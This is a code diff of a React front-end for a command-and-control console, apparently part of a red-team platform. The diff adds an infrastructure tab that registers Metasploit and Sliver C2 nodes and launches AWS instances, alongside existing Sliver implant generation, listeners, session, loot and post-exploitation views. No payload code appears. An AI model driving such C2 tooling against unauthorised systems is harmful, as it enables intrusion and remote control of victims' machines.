@@ -1,13 +1,8 @@
 import { useState, useEffect, useRef } from 'react'
-import {
-  Terminal as TerminalIcon, Package, Radio, Database,
-  Wifi, WifiOff, RefreshCw, Trash2, Play,
-  Copy, Check, Download, ChevronRight,
-  Shield, Zap, Eye, EyeOff, X, Crosshair,
-  ListChecks, Network, Camera, ArrowUpCircle, KeyRound, BookOpen
-} from 'lucide-react'
+import Icon from '@/components/Icon'
 import Terminal, { TerminalHandle } from '../components/Terminal'
-import type { Project } from '../types'
+import { getApiBase, wsUrl } from '@/lib/config'
+import { useAppStore } from '@/stores/appStore'
 
 // ── Types ──────────────────────────────────────────────────────────
 
@@ -98,15 +93,18 @@ interface PostModule {
   description: string
 }
 
+const rule = '1px solid var(--rule)'
+const ruleStrong = '1px solid var(--rule-strong)'
+
 // ── Status badge ───────────────────────────────────────────────────
 
 function SessionStatusBadge({ status, live }: { status: string; live: boolean }) {
   if (status === 'active' && live) {
     return (
-      <span className="flex items-center gap-1.5 text-xs font-semibold text-green-400">
-        <span className="relative flex h-2 w-2">
-          <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75" />
-          <span className="relative inline-flex rounded-full h-2 w-2 bg-green-500" />
+      <span style={{ display: 'flex', alignItems: 'center', gap: 6, fontSize: 11, fontWeight: 600, color: 'var(--ok)' }}>
+        <span style={{ position: 'relative', display: 'flex', width: 8, height: 8 }}>
+          <span className="animate-ping" style={{ position: 'absolute', display: 'inline-flex', width: '100%', height: '100%', borderRadius: '50%', background: 'var(--ok)', opacity: 0.75 }} />
+          <span style={{ position: 'relative', display: 'inline-flex', borderRadius: '50%', width: 8, height: 8, background: 'var(--ok)' }} />
         </span>
         ACTIVE
       </span>
@@ -114,18 +112,18 @@ function SessionStatusBadge({ status, live }: { status: string; live: boolean })
   }
   if (status === 'lost') {
     return (
-      <span className="flex items-center gap-1.5 text-xs font-semibold text-red-400">
-        <span className="relative flex h-2 w-2">
-          <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75" />
-          <span className="relative inline-flex rounded-full h-2 w-2 bg-red-500" />
+      <span style={{ display: 'flex', alignItems: 'center', gap: 6, fontSize: 11, fontWeight: 600, color: 'var(--crit)' }}>
+        <span style={{ position: 'relative', display: 'flex', width: 8, height: 8 }}>
+          <span className="animate-ping" style={{ position: 'absolute', display: 'inline-flex', width: '100%', height: '100%', borderRadius: '50%', background: 'var(--crit)', opacity: 0.75 }} />
+          <span style={{ position: 'relative', display: 'inline-flex', borderRadius: '50%', width: 8, height: 8, background: 'var(--crit)' }} />
         </span>
         LOST
       </span>
     )
   }
   return (
-    <span className="flex items-center gap-1.5 text-xs font-semibold text-slate-500">
-      <span className="inline-flex rounded-full h-2 w-2 bg-slate-600" />
+    <span style={{ display: 'flex', alignItems: 'center', gap: 6, fontSize: 11, fontWeight: 600, color: 'var(--fg-3)' }}>
+      <span style={{ display: 'inline-flex', borderRadius: '50%', width: 8, height: 8, background: 'var(--fg-4)' }} />
       INACTIVE
     </span>
   )
@@ -151,18 +149,18 @@ function SliverPanel() {
   const [protoIn, setProtoIn] = useState('mtls')
   const [startingListener, setStartingListener] = useState(false)
 
-  const inputCls = "bg-[#05080d] border border-cyan-900/30 rounded px-2 py-1.5 text-xs text-slate-200 focus:outline-none focus:border-cyan-500/50 w-full"
+  const inputCls: React.CSSProperties = { border: ruleStrong, borderRadius: 4, padding: '6px 8px', fontSize: 11, outline: 'none', width: '100%', background: 'var(--bg)', color: 'var(--fg)', fontFamily: 'var(--font-sans)' }
 
   useEffect(() => {
-    fetch('/api/v1/c2/sliver/status').then(r => r.ok ? r.json() : null).then(d => d && setStatus(d))
+    fetch(`${getApiBase()}/c2/sliver/status`).then(r => r.ok ? r.json() : null).then(d => d && setStatus(d))
   }, [])
 
   async function refresh() {
     setLoading(true)
     try {
       const [sesRes, lstRes] = await Promise.all([
-        fetch('/api/v1/c2/sliver/sessions'),
-        fetch('/api/v1/c2/sliver/listeners'),
+        fetch(`${getApiBase()}/c2/sliver/sessions`),
+        fetch(`${getApiBase()}/c2/sliver/listeners`),
       ])
       if (sesRes.ok) setSessions(await sesRes.json())
       if (lstRes.ok) setListeners(await lstRes.json())
@@ -175,7 +173,7 @@ function SliverPanel() {
     if (!lhostIn) return
     setStartingListener(true)
     try {
-      await fetch('/api/v1/c2/sliver/listeners', {
+      await fetch(`${getApiBase()}/c2/sliver/listeners`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ protocol: protoIn, lhost: lhostIn, lport: parseInt(lportIn) || 443 }),
@@ -187,7 +185,7 @@ function SliverPanel() {
   }
 
   async function stopListener(jobId: string) {
-    await fetch(`/api/v1/c2/sliver/listeners/${jobId}`, { method: 'DELETE' })
+    await fetch(`${getApiBase()}/c2/sliver/listeners/${jobId}`, { method: 'DELETE' })
     await refresh()
   }
 
@@ -195,7 +193,7 @@ function SliverPanel() {
     setGenerating(true)
     setGenResult('')
     try {
-      const res = await fetch('/api/v1/c2/sliver/generate', {
+      const res = await fetch(`${getApiBase()}/c2/sliver/generate`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ ...genForm, lport: parseInt(genForm.lport) || 443 }),
@@ -208,60 +206,60 @@ function SliverPanel() {
     }
   }
 
+  const sliverBorder = '1px solid rgba(167,139,250,0.2)'
+  const sliverSub = '1px solid rgba(167,139,250,0.1)'
   return (
-    <div className="glass rounded-xl overflow-hidden border border-purple-900/30">
-      <div className="px-4 py-3 border-b border-purple-900/20 flex items-center justify-between">
-        <span className="text-xs font-semibold text-slate-400 uppercase tracking-wider flex items-center gap-2">
-          <Crosshair size={13} className="text-purple-400" /> Sliver C2
+    <div style={{ background: 'var(--bg-2)', border: sliverBorder, borderRadius: 4, overflow: 'hidden' }}>
+      <div style={{ padding: '10px 16px', borderBottom: sliverBorder, display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
+        <span style={{ fontSize: 11, fontWeight: 600, color: 'var(--fg-3)', textTransform: 'uppercase', letterSpacing: '0.08em', display: 'flex', alignItems: 'center', gap: 8 }}>
+          <Icon name="target" size={13} style={{ color: '#a78bfa' }} /> Sliver C2
           {status?.available && status.connected && (
-            <span className="text-[10px] font-normal text-purple-300 bg-purple-900/30 px-1.5 py-0.5 rounded">{status.version}</span>
+            <span style={{ fontSize: 10, fontWeight: 400, color: '#a78bfa', background: 'rgba(167,139,250,0.15)', padding: '1px 6px', borderRadius: 4 }}>{status.version}</span>
           )}
         </span>
-        <div className="flex items-center gap-2">
+        <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
           {status !== null && (
-            <span className={`text-[10px] font-semibold ${status.connected ? 'text-green-400' : status.available ? 'text-amber-400' : 'text-slate-600'}`}>
+            <span style={{ fontSize: 10, fontWeight: 600, color: status.connected ? 'var(--ok)' : status.available ? 'var(--accent)' : 'var(--fg-4)' }}>
               {status.connected ? 'CONNECTED' : status.available ? 'NOT CONNECTED' : 'NOT INSTALLED'}
             </span>
           )}
-          <button onClick={refresh} disabled={loading} className="text-slate-600 hover:text-purple-400 transition-colors">
-            <RefreshCw size={12} className={loading ? 'animate-spin' : ''} />
+          <button onClick={refresh} disabled={loading} style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'var(--fg-4)', padding: 0 }}>
+            <Icon name="refresh" size={12} className={loading ? 'animate-spin' : ''} />
           </button>
         </div>
       </div>
 
       {!status?.available ? (
-        <div className="px-4 py-6 text-center text-xs text-slate-600 space-y-1">
+        <div style={{ padding: '24px 16px', textAlign: 'center', fontSize: 11, color: 'var(--fg-4)', display: 'flex', flexDirection: 'column', gap: 4 }}>
           <p>Sliver is not installed or not configured.</p>
-          <p className="text-slate-700">Set <span className="font-mono text-slate-500">SLIVER_CONFIG</span> env var to your operator config path.</p>
+          <p style={{ color: 'var(--fg-4)' }}>Set <span style={{ fontFamily: 'var(--font-mono)', color: 'var(--fg-3)' }}>SLIVER_CONFIG</span> env var to your operator config path.</p>
         </div>
       ) : (
-        <div className="p-3 space-y-3">
+        <div style={{ padding: 12, display: 'flex', flexDirection: 'column', gap: 12 }}>
           {/* Listeners */}
           <div>
-            <div className="text-[10px] font-semibold text-slate-500 uppercase tracking-wider mb-1.5">Listeners</div>
-            <div className="grid grid-cols-4 gap-2 items-end mb-2">
-              <div className="col-span-1">
-                <select value={protoIn} onChange={e => setProtoIn(e.target.value)} className={inputCls} style={{ background: '#05080d' }}>
-                  {['mtls','https','http','dns','wg'].map(p => <option key={p} value={p}>{p}</option>)}
-                </select>
-              </div>
-              <div><input value={lhostIn} onChange={e => setLhostIn(e.target.value)} placeholder="LHOST" className={inputCls} /></div>
-              <div><input value={lportIn} onChange={e => setLportIn(e.target.value)} placeholder="Port" className={inputCls} /></div>
-              <button onClick={startListener} disabled={startingListener || !lhostIn} className="py-1.5 rounded-lg bg-purple-900/40 hover:bg-purple-800/50 border border-purple-700/30 text-xs text-purple-300 transition-all disabled:opacity-40 flex items-center justify-center gap-1">
-                {startingListener ? <RefreshCw size={10} className="animate-spin" /> : <Play size={10} />} Start
+            <div style={{ fontSize: 10, fontWeight: 600, color: 'var(--fg-3)', textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 6 }}>Listeners</div>
+            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr auto', gap: 8, alignItems: 'end', marginBottom: 8 }}>
+              <select value={protoIn} onChange={e => setProtoIn(e.target.value)} style={inputCls}>
+                {['mtls','https','http','dns','wg'].map(p => <option key={p} value={p}>{p}</option>)}
+              </select>
+              <input value={lhostIn} onChange={e => setLhostIn(e.target.value)} placeholder="LHOST" style={inputCls} />
+              <input value={lportIn} onChange={e => setLportIn(e.target.value)} placeholder="Port" style={inputCls} />
+              <button onClick={startListener} disabled={startingListener || !lhostIn} style={{ padding: '6px 10px', borderRadius: 4, background: 'rgba(167,139,250,0.15)', border: '1px solid rgba(167,139,250,0.3)', fontSize: 11, color: '#a78bfa', cursor: (startingListener || !lhostIn) ? 'not-allowed' : 'pointer', opacity: (startingListener || !lhostIn) ? 0.4 : 1, display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 4 }}>
+                {startingListener ? <Icon name="refresh" size={10} className="animate-spin" /> : <Icon name="play" size={10} />} Start
               </button>
             </div>
             {listeners.length === 0 ? (
-              <p className="text-[10px] text-slate-700 italic">No active Sliver listeners</p>
+              <p style={{ fontSize: 10, color: 'var(--fg-4)', fontStyle: 'italic' }}>No active Sliver listeners</p>
             ) : listeners.map(l => (
-              <div key={l.job_id} className="flex items-center gap-3 text-xs py-1.5 border-b border-purple-900/10">
-                <span className="relative flex h-1.5 w-1.5 flex-shrink-0">
-                  <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-purple-400 opacity-75" />
-                  <span className="relative inline-flex rounded-full h-1.5 w-1.5 bg-purple-500" />
+              <div key={l.job_id} style={{ display: 'flex', alignItems: 'center', gap: 12, fontSize: 11, padding: '6px 0', borderBottom: sliverSub }}>
+                <span style={{ position: 'relative', display: 'flex', width: 6, height: 6, flexShrink: 0 }}>
+                  <span className="animate-ping" style={{ position: 'absolute', display: 'inline-flex', width: '100%', height: '100%', borderRadius: '50%', background: '#a78bfa', opacity: 0.75 }} />
+                  <span style={{ position: 'relative', display: 'inline-flex', borderRadius: '50%', width: 6, height: 6, background: '#a78bfa' }} />
                 </span>
-                <span className="flex-1 font-mono text-[10px] text-slate-300">{l.protocol}:{l.port}</span>
-                <span className="text-slate-600 text-[10px]">#{l.job_id}</span>
-                <button onClick={() => stopListener(l.job_id)} className="text-slate-600 hover:text-red-400 transition-colors"><X size={11} /></button>
+                <span style={{ flex: 1, fontFamily: 'var(--font-mono)', fontSize: 10, color: 'var(--fg-2)' }}>{l.protocol}:{l.port}</span>
+                <span style={{ color: 'var(--fg-3)', fontSize: 10 }}>#{l.job_id}</span>
+                <button onClick={() => stopListener(l.job_id)} style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'var(--fg-3)', padding: 0 }}><Icon name="x" size={11} /></button>
               </div>
             ))}
           </div>
@@ -269,65 +267,65 @@ function SliverPanel() {
           {/* Sessions */}
           {sessions.length > 0 && (
             <div>
-              <div className="text-[10px] font-semibold text-slate-500 uppercase tracking-wider mb-1.5">Active Implants</div>
+              <div style={{ fontSize: 10, fontWeight: 600, color: 'var(--fg-3)', textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 6 }}>Active Implants</div>
               {sessions.map(s => (
-                <div key={s.sliver_id} className="flex items-center gap-3 py-1.5 border-b border-purple-900/10 text-xs">
-                  <span className={`w-1.5 h-1.5 rounded-full flex-shrink-0 ${s.status === 'active' ? 'bg-green-500' : 'bg-slate-600'}`} />
-                  <span className="font-mono text-[10px] text-slate-300 flex-1 truncate">{s.hostname || s.remote_host}</span>
-                  <span className="text-[10px] text-slate-500">{s.platform}/{s.arch}</span>
-                  {s.is_privileged && <span className="text-[9px] text-yellow-400 bg-yellow-900/20 px-1 rounded">PRIV</span>}
+                <div key={s.sliver_id} style={{ display: 'flex', alignItems: 'center', gap: 12, padding: '6px 0', borderBottom: sliverSub, fontSize: 11 }}>
+                  <span style={{ width: 6, height: 6, borderRadius: '50%', flexShrink: 0, background: s.status === 'active' ? 'var(--ok)' : 'var(--fg-4)' }} />
+                  <span style={{ fontFamily: 'var(--font-mono)', fontSize: 10, color: 'var(--fg-2)', flex: 1, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{s.hostname || s.remote_host}</span>
+                  <span style={{ fontSize: 10, color: 'var(--fg-3)' }}>{s.platform}/{s.arch}</span>
+                  {s.is_privileged && <span style={{ fontSize: 9, color: '#fbbf24', background: 'rgba(251,191,36,0.1)', padding: '0 4px', borderRadius: 3 }}>PRIV</span>}
                 </div>
               ))}
             </div>
           )}
 
           {/* Generate Implant */}
-          <div className="border-t border-purple-900/20 pt-3">
-            <div className="text-[10px] font-semibold text-slate-500 uppercase tracking-wider mb-2">Generate Implant</div>
-            <div className="grid grid-cols-2 gap-2 mb-2">
+          <div style={{ borderTop: sliverBorder, paddingTop: 12 }}>
+            <div style={{ fontSize: 10, fontWeight: 600, color: 'var(--fg-3)', textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 8 }}>Generate Implant</div>
+            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 8, marginBottom: 8 }}>
               <div>
-                <label className="text-[10px] text-slate-600 mb-0.5 block">OS</label>
-                <select value={genForm.os_target} onChange={e => setGenForm(f => ({...f, os_target: e.target.value}))} className={inputCls} style={{ background: '#05080d' }}>
+                <label style={{ fontSize: 10, color: 'var(--fg-4)', display: 'block', marginBottom: 2 }}>OS</label>
+                <select value={genForm.os_target} onChange={e => setGenForm(f => ({...f, os_target: e.target.value}))} style={inputCls}>
                   {['linux','windows','darwin'].map(o => <option key={o} value={o}>{o}</option>)}
                 </select>
               </div>
               <div>
-                <label className="text-[10px] text-slate-600 mb-0.5 block">Arch</label>
-                <select value={genForm.arch} onChange={e => setGenForm(f => ({...f, arch: e.target.value}))} className={inputCls} style={{ background: '#05080d' }}>
+                <label style={{ fontSize: 10, color: 'var(--fg-4)', display: 'block', marginBottom: 2 }}>Arch</label>
+                <select value={genForm.arch} onChange={e => setGenForm(f => ({...f, arch: e.target.value}))} style={inputCls}>
                   {['amd64','arm64','386'].map(a => <option key={a} value={a}>{a}</option>)}
                 </select>
               </div>
               <div>
-                <label className="text-[10px] text-slate-600 mb-0.5 block">C2 Protocol</label>
-                <select value={genForm.protocol} onChange={e => setGenForm(f => ({...f, protocol: e.target.value}))} className={inputCls} style={{ background: '#05080d' }}>
+                <label style={{ fontSize: 10, color: 'var(--fg-4)', display: 'block', marginBottom: 2 }}>C2 Protocol</label>
+                <select value={genForm.protocol} onChange={e => setGenForm(f => ({...f, protocol: e.target.value}))} style={inputCls}>
                   {['mtls','https','http','dns'].map(p => <option key={p} value={p}>{p}</option>)}
                 </select>
               </div>
               <div>
-                <label className="text-[10px] text-slate-600 mb-0.5 block">Format</label>
-                <select value={genForm.format} onChange={e => setGenForm(f => ({...f, format: e.target.value}))} className={inputCls} style={{ background: '#05080d' }}>
+                <label style={{ fontSize: 10, color: 'var(--fg-4)', display: 'block', marginBottom: 2 }}>Format</label>
+                <select value={genForm.format} onChange={e => setGenForm(f => ({...f, format: e.target.value}))} style={inputCls}>
                   {['exe','shared','shellcode','service'].map(f => <option key={f} value={f}>{f}</option>)}
                 </select>
               </div>
               <div>
-                <label className="text-[10px] text-slate-600 mb-0.5 block">LHOST</label>
-                <input value={genForm.lhost} onChange={e => setGenForm(f => ({...f, lhost: e.target.value}))} placeholder="C2 host" className={inputCls} />
+                <label style={{ fontSize: 10, color: 'var(--fg-4)', display: 'block', marginBottom: 2 }}>LHOST</label>
+                <input value={genForm.lhost} onChange={e => setGenForm(f => ({...f, lhost: e.target.value}))} placeholder="C2 host" style={inputCls} />
               </div>
               <div>
-                <label className="text-[10px] text-slate-600 mb-0.5 block">LPORT</label>
-                <input value={genForm.lport} onChange={e => setGenForm(f => ({...f, lport: e.target.value}))} placeholder="443" className={inputCls} />
+                <label style={{ fontSize: 10, color: 'var(--fg-4)', display: 'block', marginBottom: 2 }}>LPORT</label>
+                <input value={genForm.lport} onChange={e => setGenForm(f => ({...f, lport: e.target.value}))} placeholder="443" style={inputCls} />
               </div>
             </div>
             <button
               onClick={generateImplant}
               disabled={generating || !genForm.lhost}
-              className="w-full py-1.5 rounded-lg bg-purple-900/40 hover:bg-purple-800/50 border border-purple-700/30 text-xs text-purple-300 transition-all disabled:opacity-40 flex items-center justify-center gap-1.5"
+              style={{ width: '100%', padding: '6px 0', borderRadius: 4, background: 'rgba(167,139,250,0.15)', border: '1px solid rgba(167,139,250,0.3)', fontSize: 11, color: '#a78bfa', cursor: (generating || !genForm.lhost) ? 'not-allowed' : 'pointer', opacity: (generating || !genForm.lhost) ? 0.4 : 1, display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6 }}
             >
-              {generating ? <RefreshCw size={11} className="animate-spin" /> : <Package size={11} />}
+              {generating ? <Icon name="refresh" size={11} className="animate-spin" /> : <Icon name="layers" size={11} />}
               Generate
             </button>
             {genResult && (
-              <pre className="mt-2 bg-[#05080d] rounded p-2 text-[10px] font-mono text-slate-300 whitespace-pre-wrap max-h-24 overflow-y-auto border border-purple-900/20">{genResult}</pre>
+              <pre style={{ marginTop: 8, background: 'var(--bg)', borderRadius: 4, padding: '8px', fontSize: 10, fontFamily: 'var(--font-mono)', color: 'var(--fg-2)', whiteSpace: 'pre-wrap', maxHeight: 96, overflowY: 'auto', border: sliverBorder }}>{genResult}</pre>
             )}
           </div>
         </div>
@@ -339,9 +337,9 @@ function SliverPanel() {
 // ── Main component ─────────────────────────────────────────────────
 
 export default function C2Console() {
-  const [activeTab, setActiveTab] = useState<'sessions' | 'payloads' | 'listeners' | 'attack' | 'loot' | 'postex' | 'lotl'>('sessions')
-  const [projects, setProjects] = useState<Project[]>([])
-  const [selectedProject, setSelectedProject] = useState('')
+  const [activeTab, setActiveTab] = useState<'sessions' | 'payloads' | 'listeners' | 'attack' | 'loot' | 'postex' | 'lotl' | 'infra'>('sessions')
+  const { selectedProject: sp } = useAppStore()
+  const projectId = sp?.id ?? ''
   const [msfStatus, setMsfStatus] = useState<MsfStatus>({ connected: false })
   const [sessions, setSessions] = useState<C2Session[]>([])
   const [activeSession, setActiveSession] = useState<C2Session | null>(null)
@@ -446,23 +444,58 @@ export default function C2Console() {
   const [attackPlanError, setAttackPlanError] = useState('')
   const [generatingAttack, setGeneratingAttack] = useState(false)
 
+  // Infrastructure tab state
+  interface C2Node { id: string; name: string; c2_type: string; host: string; port: number; ssl: boolean; status: string; source: string; last_checked: string | null; notes: string }
+  interface CloudC2Instance { id: string; name: string; provider: string; instance_id: string; region: string; public_ip: string | null; status: string; c2_type: string; instance_type: string; node_id: string | null; error_msg: string | null; created_at: string }
+  const [c2Nodes, setC2Nodes] = useState<C2Node[]>([])
+  const [loadingNodes, setLoadingNodes] = useState(false)
+  const [addNodeOpen, setAddNodeOpen] = useState(false)
+  const [nodeFormName, setNodeFormName] = useState('')
+  const [nodeFormType, setNodeFormType] = useState<'msf' | 'sliver'>('msf')
+  const [nodeFormHost, setNodeFormHost] = useState('')
+  const [nodeFormPort, setNodeFormPort] = useState('55553')
+  const [nodeFormPass, setNodeFormPass] = useState('')
+  const [nodeFormSsl, setNodeFormSsl] = useState(false)
+  const [nodeFormNotes, setNodeFormNotes] = useState('')
+  const [savingNode, setSavingNode] = useState(false)
+  const [nodeError, setNodeError] = useState('')
+  const [connectingNodeId, setConnectingNodeId] = useState<string | null>(null)
+  const [checkingNodeId, setCheckingNodeId] = useState<string | null>(null)
+  const [activeNodeId, setActiveNodeId] = useState<string | null>(null)
+  const [cloudInstances, setCloudInstances] = useState<CloudC2Instance[]>([])
+  const [cloudSettingsOpen, setCloudSettingsOpen] = useState(false)
+  const [awsAccessKey, setAwsAccessKey] = useState('')
+  const [awsSecretKey, setAwsSecretKey] = useState('')
+  const [awsRegion, setAwsRegion] = useState('us-east-1')
+  const [savingCloudCreds, setSavingCloudCreds] = useState(false)
+  const [cloudStatus, setCloudStatus] = useState<{ configured: boolean; valid?: boolean; account_id?: string; error?: string } | null>(null)
+  const [launchFormOpen, setLaunchFormOpen] = useState(false)
+  const [launchName, setLaunchName] = useState('')
+  const [launchRegion, setLaunchRegion] = useState('us-east-1')
+  const [launchC2Type, setLaunchC2Type] = useState<'msf' | 'sliver'>('msf')
+  const [launchInstanceType, setLaunchInstanceType] = useState('t3.medium')
+  const [launchingInstance, setLaunchingInstance] = useState(false)
+  const [provisionInstanceId, setProvisionInstanceId] = useState<string | null>(null)
+  const [provisionLog, setProvisionLog] = useState<string[]>([])
+  const provisionWsRef = useRef<WebSocket | null>(null)
+  const provisionLogRef = useRef<HTMLDivElement>(null)
+
   // Terminal input
   const [termInput, setTermInput] = useState('')
 
   useEffect(() => {
-    loadProjects()
     checkStatus()
     loadPayloads()
   }, [])
 
   useEffect(() => {
-    if (!selectedProject) return
+    if (!projectId) return
     loadSessions()
     loadLoot()
     // Auto-sync: poll sessions every 30 s to pick up backend-synced sessions
     const autoSyncTimer = setInterval(loadSessions, 30_000)
     return () => clearInterval(autoSyncTimer)
-  }, [selectedProject])
+  }, [projectId])
 
   useEffect(() => {
     if (msfStatus.connected) {
@@ -489,54 +522,152 @@ export default function C2Console() {
   useEffect(() => {
     if (activeTab === 'listeners') loadListeners()
     if (activeTab === 'lotl') loadLotl()
+    if (activeTab === 'infra') {
+      loadC2Nodes(); loadCloudInstances()
+      fetch(`${getApiBase()}/cloud/aws/status`).then(r => r.ok ? r.json() : null).then(d => { if (d) setCloudStatus(d) }).catch(() => {})
+    }
   }, [activeTab])
 
-  async function loadProjects() {
-    const res = await fetch('/api/v1/projects')
-    const data = await res.json()
-    setProjects(data)
-    if (data.length > 0) setSelectedProject(data[0].id)
-  }
-
   async function checkStatus() {
-    const res = await fetch('/api/v1/c2/status')
+    const res = await fetch(`${getApiBase()}/c2/status`)
     if (res.ok) setMsfStatus(await res.json())
   }
 
   async function loadPayloads() {
-    const res = await fetch('/api/v1/c2/payloads')
+    const res = await fetch(`${getApiBase()}/c2/payloads`)
     if (res.ok) setPayloads(await res.json())
   }
 
   async function loadLotl() {
     if (lotlLib.length > 0) return
-    const res = await fetch('/api/v1/c2/lotl')
+    const res = await fetch(`${getApiBase()}/c2/lotl`)
     if (res.ok) {
       const data = await res.json()
       setLotlLib(data.categories || [])
     }
   }
 
+  async function loadC2Nodes() {
+    setLoadingNodes(true)
+    try {
+      const [nodesRes, activeRes] = await Promise.all([
+        fetch(`${getApiBase()}/c2/nodes`),
+        fetch(`${getApiBase()}/c2/nodes/active`),
+      ])
+      if (nodesRes.ok) setC2Nodes(await nodesRes.json())
+      if (activeRes.ok) { const d = await activeRes.json(); setActiveNodeId(d.active_node_id ?? null) }
+    } finally { setLoadingNodes(false) }
+  }
+
+  async function loadCloudInstances() {
+    const res = await fetch(`${getApiBase()}/cloud/instances`)
+    if (res.ok) setCloudInstances(await res.json())
+  }
+
+  async function handleAddNode() {
+    if (!nodeFormName || !nodeFormHost) { setNodeError('Name and host are required.'); return }
+    setSavingNode(true); setNodeError('')
+    try {
+      const res = await fetch(`${getApiBase()}/c2/nodes`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ name: nodeFormName, c2_type: nodeFormType, host: nodeFormHost, port: parseInt(nodeFormPort) || 55553, password: nodeFormPass, ssl: nodeFormSsl, notes: nodeFormNotes }),
+      })
+      if (!res.ok) { const d = await res.json(); setNodeError(d.detail ?? 'Failed to save node'); return }
+      await loadC2Nodes()
+      setAddNodeOpen(false)
+      setNodeFormName(''); setNodeFormHost(''); setNodeFormPass(''); setNodeFormNotes('')
+    } finally { setSavingNode(false) }
+  }
+
+  async function handleDeleteNode(id: string) {
+    await fetch(`${getApiBase()}/c2/nodes/${id}`, { method: 'DELETE' })
+    await loadC2Nodes()
+  }
+
+  async function handleConnectNode(id: string) {
+    setConnectingNodeId(id)
+    try {
+      const res = await fetch(`${getApiBase()}/c2/nodes/${id}/connect`, { method: 'POST' })
+      if (res.ok) { setActiveNodeId(id); await checkStatus() }
+    } finally { setConnectingNodeId(null) }
+  }
+
+  async function handleCheckNode(id: string) {
+    setCheckingNodeId(id)
+    try {
+      await fetch(`${getApiBase()}/c2/nodes/${id}/check`, { method: 'POST' })
+      await loadC2Nodes()
+    } finally { setCheckingNodeId(null) }
+  }
+
+  async function handleSaveCloudCreds() {
+    setSavingCloudCreds(true)
+    try {
+      const res = await fetch(`${getApiBase()}/cloud/aws/credentials`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ access_key: awsAccessKey, secret_key: awsSecretKey, region: awsRegion }),
+      })
+      if (res.ok) {
+        const statusRes = await fetch(`${getApiBase()}/cloud/aws/status`)
+        if (statusRes.ok) setCloudStatus(await statusRes.json())
+      }
+    } finally { setSavingCloudCreds(false) }
+  }
+
+  async function handleLaunchEC2() {
+    if (!launchName) return
+    setLaunchingInstance(true); setProvisionLog([])
+    try {
+      const res = await fetch(`${getApiBase()}/cloud/instances`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ name: launchName, c2_type: launchC2Type, region: launchRegion, instance_type: launchInstanceType }),
+      })
+      if (!res.ok) { const d = await res.json(); setProvisionLog([`Error: ${d.detail ?? 'Launch failed'}`]); return }
+      const { instance_db_id } = await res.json()
+      setProvisionInstanceId(instance_db_id)
+      setLaunchFormOpen(false)
+      const ws = new WebSocket(wsUrl(`/ws/cloud/provision/${instance_db_id}`))
+      provisionWsRef.current = ws
+      ws.onmessage = e => {
+        try {
+          const msg = JSON.parse(e.data)
+          if (msg.type === 'stdout' || msg.type === 'log') {
+            setProvisionLog(p => [...p, msg.data])
+            setTimeout(() => { provisionLogRef.current?.scrollTo(0, provisionLogRef.current.scrollHeight) }, 50)
+          }
+          if (msg.type === 'done' || msg.type === 'exit') {
+            loadCloudInstances(); loadC2Nodes()
+          }
+        } catch { setProvisionLog(p => [...p, e.data]) }
+      }
+      ws.onerror = () => setProvisionLog(p => [...p, '[WebSocket error]'])
+      ws.onclose = () => { provisionWsRef.current = null; loadCloudInstances(); loadC2Nodes() }
+    } finally { setLaunchingInstance(false) }
+  }
+
   async function loadSessions() {
-    if (!selectedProject) return
-    const res = await fetch(`/api/v1/c2/sessions?project_id=${selectedProject}`)
+    if (!projectId) return
+    const res = await fetch(`${getApiBase()}/c2/sessions?project_id=${projectId}`)
     if (res.ok) setSessions(await res.json())
   }
 
   async function loadLoot() {
-    if (!selectedProject) return
-    const res = await fetch(`/api/v1/c2/loot?project_id=${selectedProject}`)
+    if (!projectId) return
+    const res = await fetch(`${getApiBase()}/c2/loot?project_id=${projectId}`)
     if (res.ok) setLoot(await res.json())
   }
 
   async function loadListeners() {
-    const res = await fetch('/api/v1/c2/listeners')
+    const res = await fetch(`${getApiBase()}/c2/listeners`)
     if (res.ok) setListeners(await res.json())
   }
 
   async function loadPostModules(platform: string) {
     const p = platform.toLowerCase().includes('win') ? 'windows' : platform.toLowerCase().includes('linux') ? 'linux' : 'multi'
-    const res = await fetch(`/api/v1/c2/post-modules?platform=${p}`)
+    const res = await fetch(`${getApiBase()}/c2/post-modules?platform=${p}`)
     if (res.ok) setPostModules(await res.json())
   }
 
@@ -544,7 +675,7 @@ export default function C2Console() {
     setConnecting(true)
     setConnectError('')
     try {
-      const res = await fetch('/api/v1/c2/connect', {
+      const res = await fetch(`${getApiBase()}/c2/connect`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ host: msfHost, port: parseInt(msfPort), password: msfPass, ssl: false }),
@@ -564,10 +695,10 @@ export default function C2Console() {
   }
 
   async function handleSync() {
-    if (!selectedProject) return
+    if (!projectId) return
     setLoading(true)
     try {
-      await fetch(`/api/v1/c2/sessions/sync?project_id=${selectedProject}`, { method: 'POST' })
+      await fetch(`${getApiBase()}/c2/sessions/sync?project_id=${projectId}`, { method: 'POST' })
       await loadSessions()
     } finally {
       setLoading(false)
@@ -575,7 +706,7 @@ export default function C2Console() {
   }
 
   async function handleKillSession(session: C2Session) {
-    await fetch(`/api/v1/c2/sessions/${session.id}?kill=true`, { method: 'DELETE' })
+    await fetch(`${getApiBase()}/c2/sessions/${session.id}?kill=true`, { method: 'DELETE' })
     if (activeSession?.id === session.id) setActiveSession(null)
     loadSessions()
   }
@@ -585,7 +716,7 @@ export default function C2Console() {
     setGeneratingPayload(true)
     try {
